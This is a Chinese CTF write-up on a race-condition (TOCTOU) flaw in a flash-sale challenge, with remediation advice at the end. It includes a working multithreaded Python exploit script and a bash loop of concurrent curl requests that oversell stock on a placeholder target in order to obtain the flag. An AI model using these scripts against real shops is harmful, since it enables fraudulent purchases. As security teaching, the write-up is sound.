# 限时秒杀 - WriteUP

## 设计缺陷分析

本题考察的是**条件竞争（Race Condition）**，属于 OWASP A06 Insecure Design 的典型场景。

系统的秒杀流程存在严重的设计缺陷：
- 库存检查、订单创建、库存扣减分为三个独立的 API 调用
- `create-order` 接口内部先执行 `SELECT` 查询库存，然后在应用层判断 `quantity > 0`，最后再执行 `UPDATE` 扣减库存
- 整个过程**没有使用数据库事务锁定（如 `BEGIN IMMEDIATE` 或 `SELECT FOR UPDATE`）**
- 检查库存和扣减库存之间存在时间窗口（本题中人为增加了 100ms 延迟）

这是典型的 **Time-of-Check to Time-of-Use (TOCTOU)** 漏洞。多个并发请求可以同时通过库存检查，然后都执行扣减操作，导致**超卖**。

## 利用步骤

### 步骤1：确认库存

```bash
curl http://target/api/stock
```

### 步骤2：使用多线程并发发送创建订单请求

由于前端是顺序执行三个步骤的，正常情况下无法触发竞争条件。需要编写脚本并发发送多个 `create-order` 请求。

### 步骤3：支付成功创建的订单

## EXP脚本

```python
import requests
import threading
import time

TARGET = "http://target"
NUM_THREADS = 50

orders = []
lock = threading.Lock()


def create_order():
    try:
        # 先检查库存
        r = requests.post(f"{TARGET}/api/check-stock", timeout=5)
        if not r.json().get('available'):
            return

        # 并发创建订单
        r = requests.post(f"{TARGET}/api/create-order", timeout=5)
        data = r.json()
        if data.get('success'):
            with lock:
                orders.append(data['order_no'])
            print(f"[+] 创建订单成功: {data['order_no']}")
    except Exception as e:
        print(f"[-] 请求失败: {e}")


def main():
    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=create_order)
        threads.append(t)

    # 同时启动所有线程，最大化竞争条件触发概率
    for t in threads:
        t.start()

    for t in threads:
        t.join()

    print(f"\n[*] 共创建 {len(orders)} 个订单")

    # 尝试支付所有订单
    for order_no in orders:
        try:
            r = requests.post(
                f"{TARGET}/api/pay",
                json={"order_no": order_no},
                timeout=5
            )
            data = r.json()
            if data.get('flag'):
                print(f"\n[+] 获取到Flag: {data['flag']}")
                return
            else:
                print(f"[-] 订单 {order_no} 支付失败: {data.get('message')}")
        except Exception as e:
            print(f"[-] 支付失败: {e}")


if __name__ == '__main__':
    main()
```

### 简化版 curl 验证

如果没有 Python 环境，也可以在 Linux 下使用 bash 并发：

```bash
# 并发发送50个创建订单请求
for i in $(seq 1 50); do
  curl -s -X POST http://target/api/create-order &
done
wait

# 然后分别用返回的订单号尝试支付
```

## 修复建议

1. **数据库事务锁定**：使用 `BEGIN IMMEDIATE` 事务，并在查询库存时加锁：
   ```sql
   BEGIN IMMEDIATE;
   SELECT quantity FROM stock WHERE id = 1;
   -- 应用层检查
   UPDATE stock SET quantity = quantity - 1 WHERE id = 1;
   COMMIT;
   ```
2. **原子操作**：使用单行原子更新代替先查后更：
   ```sql
   UPDATE stock SET quantity = quantity - 1 WHERE id = 1 AND quantity > 0;
   ```
3. **唯一约束**：对秒杀商品添加唯一订单约束，确保仅生成一份有效订单
4. **队列机制**：使用消息队列（如 Redis + Lua 原子脚本）处理秒杀请求
